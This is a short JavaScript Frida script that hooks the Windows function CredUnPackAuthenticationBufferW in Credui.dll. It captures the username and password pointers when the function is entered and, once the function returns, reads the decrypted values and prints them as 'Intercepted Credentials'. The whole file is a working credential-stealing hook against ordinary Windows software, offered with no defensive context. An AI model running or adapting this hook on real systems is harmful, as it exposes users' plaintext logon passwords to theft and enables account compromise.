var pszUserName, pszPassword, decryptedUsername, decryptedPassword;
var credUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW");

Interceptor.attach(credUnPackAuthenticationBufferW, {
    onEnter: function (args)
	{
        // Credentials here are still encrypted
        pszUserName = args[3];
        pszPassword = args[7];
    },
    
	onLeave: function (result)
	{
        // Credentials are now decrypted
        decryptedUsername = pszUserName.readUtf16String()
        decryptedPassword = pszPassword.readUtf16String()
        if (decryptedUsername && decryptedPassword)
		{
			console.log("\n[*] Intercepted Credentials: ");
			console.log("[+] Username: " + decryptedUsername);
			console.log("[+] Password: " + decryptedPassword);
        }
    }
});